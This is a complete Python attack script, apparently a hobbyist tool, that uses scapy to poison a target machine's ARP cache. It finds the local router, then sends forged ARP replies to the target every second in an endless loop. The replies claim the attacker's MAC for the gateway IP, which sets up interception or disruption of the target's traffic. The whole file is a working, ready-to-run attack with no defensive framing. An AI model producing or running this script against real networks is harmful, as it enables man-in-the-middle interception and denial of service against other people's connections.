#!/usr/bin/python


'''
this script is made by ahmed assem
usage , ./script.py interface target
'''





from scapy.all import ARP,Ether,getmacbyip,sendp,get_if_hwaddr
from socket import *
import time
import scanner
import sys
import os

red = "\033[1;31m"
yellow = "\033[1;33m"
cyan = "\033[1;36m"
grey = "\033[0;37m"


if os.geteuid() != 0:
    print(yellow + "[!] you need super user.")
    exit()


iface = sys.argv[1]
target = sys.argv[2]

def get_the_router():
    router = "192.168.1.1"
    ranges = [1,253,254,255]
    for r in ranges:
        if scanner.check("192.168.1." + str(r),True):
            router = "192.168.1." + str(r)
            break
        else:
            None
    return router

def send_packets_to(target):
    global iface
    gateway = get_the_router()
    target_mac = getmacbyip(target)
    packet = Ether(src=get_if_hwaddr(iface),dst=target_mac) / ARP(hwsrc=get_if_hwaddr(iface),psrc=gateway,pdst=target,hwdst=target_mac)
    while True:
        try:
            sendp(packet,iface=iface,inter=1,verbose=0)
            print(grey + time.ctime() + " ARP packet sent.")
            time.sleep(1)
        except Exception as e:
            print(red + "[-] Something Went Wrong :(")
            print(str(e))
            exit()


def main():
    global target
    print(yellow + "[!] Locating the router.....")
    router = get_the_router()
    print(cyan + "[+] Router IP is " + router)

    if scanner.check(target,True):
        send_packets_to(target)
    else:
        print(red + "[-] invalid host")
        exit()


main()

